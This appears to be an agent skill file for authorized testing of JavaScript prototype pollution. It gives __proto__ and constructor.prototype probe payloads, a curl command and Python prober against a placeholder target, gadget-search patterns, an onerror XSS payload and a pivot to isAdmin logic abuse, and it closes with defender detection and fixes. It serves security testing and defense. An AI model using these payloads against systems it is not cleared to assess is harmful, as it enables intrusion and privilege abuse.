---
name: prototype-pollution
description: Use when testing JavaScript applications for prototype
  pollution on an authorized assessment. Covers detection via
  __proto__ payloads, gadget hunting, pollution to XSS escalation, and
  server side pollution in Node.js. Also use when reviewing JS code
  that merges user input into objects recursively.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: 2026-10-23
requires: []
extends: []
relates: [web-xss, ssti, deserialization-attacks]
tools:
  - name: Python
    version: 3.12
  - name: Burp Suite
    version: 2026.2
---

Prototype pollution lets an attacker add properties to JavaScript's
Object.prototype through recursive merge functions, so every object
in the app inherits attacker controlled values. This skill covers
authorized testing: detecting pollution points in client and server
JS, finding gadgets that turn pollution into impact, and escalating
to XSS or logic abuse. Test only applications you may assess.

## Quick Workflow

1. Find merge points: query parsers, JSON deep merge, config merge,
   and any recursive object assignment.
2. Test pollution with a canary property and check Object.prototype.
3. Identify gadgets: code that reads the polluted property in a
   dangerous way (innerHTML, eval, fetch URL).
4. Escalate client side pollution to XSS via a gadget.
5. Test server side (Node.js) pollution for auth bypass or logic
   flaws.
6. Check the merge library version against known CVEs.
7. Document the payload, the gadget, and the impact chain.
8. Recommend safe merge (no __proto__ keys, structuredClone, or
   hardened libraries).

## 1. Detection

```bash
# Client side: test a query parameter merge point in the console
# (on the authorized test page)
# ?config[__proto__][polluted]=yes  then check:
# Object.prototype.polluted === "yes" means pollution works
echo "payload: ?x[__proto__][canary]=pp123 then read {}.canary"
```

```bash
# Server side probe: JSON body with __proto__ through the API
curl -s -X POST 'https://target.example/api/profile' \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"test","__proto__":{"canary":"pp123"}}' | head -c 200
# Then check a reflected value or behavior that would read the canary
```

```python
#!/usr/bin/env python3
"""Pollution prober: sends __proto__ payloads to JSON endpoints."""
import json, urllib.request

ENDPOINT = "https://target.example/api/profile"
TOKEN = "REPLACE_WITH_TEST_TOKEN"
payloads = [
    {"__proto__": {"canary": "pp123"}},
    {"a": {"__proto__": {"canary": "pp123"}}},
    {"constructor": {"prototype": {"canary": "pp123"}}},
]
for p in payloads:
    req = urllib.request.Request(
        ENDPOINT, data=json.dumps(p).encode(),
        headers={"Content-Type": "application/json",
                 "Authorization": f"Bearer {TOKEN}"})
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            print(r.status, str(p)[:60])
    except Exception as e:  # noqa: BLE001
        print("error", str(e)[:80])
```

## 2. Gadget hunting and escalation

```bash
# Gadget patterns to search in client JS bundles:
# - el.innerHTML = config.template   (pollute template -> XSS)
# - fetch(config.apiUrl)             (pollute apiUrl -> SSRF-ish)
# - eval(config.handler)             (pollute handler -> code exec)
grep -rhoE "(innerHTML|eval|fetch)\([^)]*config[^)]*\)" /tmp/app.js | head -10
```

```bash
# Confirm the gadget chain: pollute, then trigger the gadget
# Example: pollute config.template with <img src=x onerror=alert(1)>
# then navigate to the view that renders config.template
echo "each link (pollution point + gadget + trigger) must be documented"
```

## Edge cases

- The merge blocks __proto__ but not constructor.prototype. Test
  both; many fixes miss the second.
- Pollution works but no gadget exists. Report as a latent flaw with
  the pollution proof, not as XSS.
- Server side pollution in a shared Node process affects other
  tenants. Stop at the canary; do not pollute shared state broadly.
- The library is patched but used unsafely (custom merge). Review the
  custom code, not just the dependency version.

## Escalation

- No gadget in first party code: check third party scripts on the
  page; they often contain gadgets.
- Client side dead end: pivot to server side Node pollution for
  logic flaws (isAdmin flags are the classic).
- Merge point unclear: instrument with a proxy and watch which
  requests carry nested objects.

## Detection and defender view

Defenders see prototype pollution as requests with __proto__,
constructor, and prototype keys in parameters or JSON bodies. Detect
with WAF rules on those keys and with client side monitoring for
unexpected Object.prototype properties. The durable fix is in code:
block polluting keys in merges, use Map instead of plain objects for
untrusted data, and keep dependencies patched.

## Key references

- CWE-1321 (Improperly Controlled Modification of Object Prototype
  Attributes, Prototype Pollution).
- MITRE ATT&CK T1190 (Exploit Public-Facing Application).
- Prototype pollution research (Black Hat, PortSwigger materials).
